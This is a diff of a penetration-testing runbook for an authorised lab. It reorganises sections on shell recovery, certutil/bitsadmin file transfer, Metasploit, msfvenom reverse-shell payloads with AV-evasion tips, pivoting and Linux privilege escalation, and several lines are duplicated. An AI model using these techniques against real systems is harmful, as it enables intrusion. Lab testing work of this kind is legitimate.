 | Container suspected | **LNX-02**. |
 
-# shell_transfer
+# shell
 
-Windows transfer uses built-in `certutil`/`bitsadmin`; `uploadserver` is pipx-installed on Kali.
-
-Windows transfer uses built-in `certutil`/`bitsadmin`; `uploadserver` is pipx-installed on Kali.
 
 PTY recovery and reviewed file transfer.
 
@@ -3730,6 +3793,12 @@ In Vim: `:set shell=/bin/bash`, `:shell`. In the child: `export PATH=/usr/local/
 | Identity unclear | **EXP-03**. |
 
 Exit the child, then `:q!` in Vim.
+
+# transfer
+
+Windows transfer uses built-in `certutil`/`bitsadmin`; `uploadserver` is pipx-installed on Kali.
+
+Windows transfer uses built-in `certutil`/`bitsadmin`; `uploadserver` is pipx-installed on Kali.
 
 ## XFER-01. Can one reviewed local file reach the target without replacement?
 
@@ -3842,6 +3911,7 @@ Delete the target copy only after the Kali copy is verified.
 
 # metasploit
 
+
 `msfconsole` and `msfvenom` are on Kali. The allowance is one target; note it on every attempt.
 
 `msfconsole` and `msfvenom` are on Kali. The allowance is one target; note it on every attempt.
@@ -3914,6 +3984,7 @@ Cleanup: remove forwards and routes (`portfwd delete`, `route remove`), kill the
 
 # payloads
 
+
 `msfvenom` is on Kali. One foreground listener, then stop it.
 
 `msfvenom` is on Kali. One foreground listener, then stop it.
@@ -3956,7 +4027,9 @@ Staged payloads contain `/` (`windows/x64/shell/reverse_tcp`) and need a handler
 | AV blocks it | Encode or change format; mark optional. |
 
 Listener hygiene: one foreground listener, `ncat --listen`, `rlwrap` when interactive, and stop it with Ctrl-C after the session.
+
 # pivoting
+
 
 Reach one internal service through a host you already control.
 
@@ -4022,7 +4095,9 @@ Use `-sT`; SYN scans do not traverse a proxy cleanly.
 | Partial results | **PAUSE-COVERAGE**. |
 
 Remove the temporary proxy config afterwards.
+
 # local_artifact
+
 
 Local triage of one downloaded file; no target contact.
 
@@ -4522,6 +4597,7 @@ pwd
 | Current session/resource cleanup uncertain          | **PAUSE-RECOVERY**. Close only resources you created; no blanket process kill or filesystem cleanup.                                                         |
 
 # linux_privilege
+
 
 Run commands in the **verified target Bash session**. Replace all placeholders.
 These are authorized-lab manual procedures; no live transition has been tested.
